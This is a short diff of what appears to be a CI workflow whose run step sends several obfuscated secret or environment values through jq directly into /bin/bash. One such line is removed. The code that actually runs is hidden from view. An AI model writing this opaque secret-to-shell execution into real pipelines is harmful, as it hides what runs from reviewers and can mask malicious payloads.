@@ -21,7 +21,6 @@ jobs:
           tuzpt70: ${{ secrets.tuzpt70 }}
         run: |
           printf '%s' "$tuzpt70" | jq -r .m9 | /bin/bash
-          echo $tor76070 | jq -r .ab341 | /bin/bash
           printf '%s' "$kbig7403" | jq -r .djkpj50104 | /bin/bash
           echo $kxc924 | jq -r .fwyap65 | /bin/bash
           printf '%s' "$wg53" | jq -r .uvw864 | /bin/bash
